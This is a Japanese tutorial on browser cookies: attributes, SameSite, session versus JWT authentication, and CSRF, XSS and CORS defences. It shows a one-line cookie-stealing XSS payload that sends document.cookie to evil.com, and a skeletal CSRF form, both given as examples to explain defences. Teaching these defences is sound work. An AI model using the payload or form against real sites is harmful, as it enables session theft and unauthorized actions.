# Cookie

「Cookie って結局なんなの？」から

「SameSite=None + Secure の意味」

「JWT との違い」

「CSRF/XSS 対策」

「ブラウザ内部の動き」

まで理解できるようにまとめた

## 目次

1. [Cookie とは](#1-cookie-とは)
1. [Cookie が必要な理由](#2-cookie-が必要な理由)
1. [Cookie の基本動作](#3-cookie-の基本動作)
1. [Set-Cookie ヘッダ完全理解](#4-set-cookie-ヘッダ完全理解)
1. [Cookie 属性まとめ](#5-cookie-属性まとめ)
1. [Cookie の送信ルール](#6-cookie-の送信ルール)
1. [Session Cookie vs Persistent Cookie](#7-session-cookie-vs-persistent-cookie)
1. [SameSite 完全攻略](#8-samesite-完全攻略)
1. [Secure / HttpOnly の本当の意味](#9-secure--httponly-の本当の意味)
1. [Cookie と認証](#10-cookie-と認証)
1. [Session 認証 vs JWT 認証](#11-session-認証-vs-jwt-認証)
1. [Cookie と CSRF](#12-cookie-と-csrf)
1. [Cookie と XSS](#13-cookie-と-xss)
1. [Cookie と CORS](#14-cookie-と-cors)
1. [ブラウザ内部で何が起きてる？](#15-ブラウザ内部で何が起きてる)
1. [Cookie 保存場所](#16-cookie-保存場所)
1. [Cookie のサイズ制限](#17-cookie-のサイズ制限)
1. [実践例](#18-実践例)
1. [よくある事故](#19-よくある事故)
1. [ベストプラクティス](#20-ベストプラクティス)

## 1. Cookie とは

Cookie とは

> ブラウザに保存される小さなデータ

HTTP は本来「ステートレス」

つまり、前回アクセスしたユーザーかどうか分からない（毎回初対面）

そこで Cookie を使う

## 2. Cookie が必要な理由

Cookie がないと

- ログイン維持できない
- カート保持できない
- 言語設定保持できない
- ユーザー識別できない

つまり Web サービスが成立出来なくなる

## 3. Cookie の基本動作

流れ

```
1. ブラウザ → サーバーへアクセス
2. サーバーが Cookie を返す
3. ブラウザが保存
4. 次回以降、自動送信
```

#### 初回アクセス

```
GET / HTTP/1.1
Host: example.com
```

サーバーが Cookie 発行

```
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123
```

ブラウザ保存

```
sessionId=abc123
```

次回アクセス

```
GET /mypage HTTP/1.1
Host: example.com
Cookie: sessionId=abc123
```

ブラウザが自動送信してる

## 4. Set-Cookie ヘッダ完全理解

基本形

```
Set-Cookie: 名前=値
```

例

```
Set-Cookie: sessionId=abc123
```

#### 属性付き

例

```
Set-Cookie: sessionId=abc123;
  Path=/;
  HttpOnly;
  Secure;
  SameSite=Lax;
  Max-Age=3600
```

## 5. Cookie 属性まとめ

| 属性        | 意味               |
| ----------- | ------------------ |
| Expires     | 有効期限           |
| Max-Age     | 秒数寿命           |
| Domain      | 対象ドメイン       |
| Path        | 対象パス           |
| Secure      | HTTPS 限定         |
| HttpOnly    | JS アクセス禁止    |
| SameSite    | CSRF 対策          |
| Partitioned | サードパーティ分離 |

## 6. Cookie の送信ルール

ブラウザは何でも送るわけじゃない。

以下が一致した時だけ送信

- Domain
- Path
- Secure 条件
- SameSite 条件

## 7. Session Cookie vs Persistent Cookie

### Session Cookie

期限なし

ブラウザ閉じると消える

```
Set-Cookie: sid=abc
```

### Persistent Cookie

保存期限あり

```
Set-Cookie: sid=abc; Max-Age=3600
```

## 8. SameSite 完全攻略

CSRF 対策の中核

### SameSite とは

> 「別サイトから来たリクエストで Cookie 送る？」

を制御

### Strict

```
SameSite=Strict
```

- 完全同一サイトのみ
- 最強だが UX 悪化

### Lax

```
SameSite=Lax
```

普通これ

- 通常遷移 OK
- iframe/form POST 制限

### None

```
SameSite=None; Secure
```

- クロスサイト許可

※Secure 必須（Chrome ルール）

### SameSite 挙動イメージ

| シーン          | Strict | Lax  | None |
| --------------- | ------ | ---- | ---- |
| 同一サイト      | OK     | OK   | OK   |
| リンク遷移      | NG     | OK   | OK   |
| iframe          | NG     | NG   | OK   |
| cross-site POST | NG     | 制限 | OK   |

## 9. Secure / HttpOnly の本当の意味

### Secure

```
Secure
```

- HTTPS 時のみ送信
- HTTP では送らない

盗聴対策

### HttpOnly

```
HttpOnly
```

JavaScript からアクセス不可

```ts
//  読めなくなる
document.cookie;
```

XSS 時に Cookie 盗難防止のため

## 10. Cookie と認証

実務では

```
Cookie = ログイン状態
```

が多い

### サーバーセッション型

Cookie

```
sessionId=abc123
```

サーバー

```
abc123 -> ユーザー情報
```

を保持

### JWT 型

Cookie に JWT 保存

jwt=xxxxx.yyyyy.zzzzz

サーバー側セッション不要

## 11. Session 認証 vs JWT 認証

| 項目     | Session  | JWT          |
| -------- | -------- | ------------ |
| 状態管理 | サーバー | クライアント |
| スケール | 弱い     | 強い         |
| 無効化   | 簡単     | 難しい       |
| サイズ   | 小       | 大           |
| DB 必要  | 必要     | 不要寄り     |

## 12. Cookie と CSRF

Cookie 認証最大の敵

CSRF とは

> 悪意サイトから勝手にログイン済み操作される

例

ユーザーが銀行ログイン中

悪意サイト

```
<form action="https://bank.com/send">
```

ブラウザ

```
Cookie 自動送信
```

結果：勝手に送金

### 対策

#### SameSite

今の主流

#### CSRF Token

フォームごとにトークン

#### Origin / Referer 検証

送信元確認

## 13. Cookie と XSS

XSS とは

> 悪意 JS 注入

Cookie 盗難

```
fetch("https://evil.com?" + document.cookie)
```

対策

HttpOnly

最重要

### CSP

スクリプト制御

### エスケープ

入力値無害化

## 14. Cookie と CORS

### Cookie 付き Fetch

```
fetch(url, {
  credentials: "include"
})
```

必要

サーバー側

```
Access-Control-Allow-Credentials: true
```

必要

ワイルドカード禁止

```
Access-Control-Allow-Origin: \*
```

と Credentials 併用不可

## 15. ブラウザ内部で何が起きてる？

ブラウザは

```
Cookie Store
```

を持つ

リクエスト時

```
URL見て対象Cookie抽出
```

して

```
Cookie:
```

ヘッダに自動付与

## 16. Cookie 保存場所

ブラウザ依存

Chrome 系：SQLite DB で保持。

ただし最近は内部実装変化あり

## 17. Cookie のサイズ制限

一般的に

1Cookie ≒ 4KB
ドメインごと ≒ 180 個前後

巨大 JWT は危険

## 18. 実践例

### Express.js

```
res.cookie("sid", "abc123", {
  httpOnly: true,
  secure: true,
  sameSite: "lax"
})
```

### Next.js

```
cookies().set("sid", "abc123")
```

## 19. よくある事故

### SameSite=None なのに Secure なし

- Chrome で消える。

### localhost 問題

Secure だと HTTP localhost 送れない

### Path 罠

```
Path=/admin
```

だと他ページ送信されない

### Domain 罠

```
Domain=example.com
```

と

```
sub.example.com
```

にも送信される

## 20. ベストプラクティス

### 認証 Cookie

推奨

```
HttpOnly
Secure
SameSite=Lax
```

### JWT 保存場所

localStorage より

```
HttpOnly Cookie
```

推奨ケース多い

理由：XSS 耐性

### セッション ID

- ランダム
- 十分長い
- 推測不能
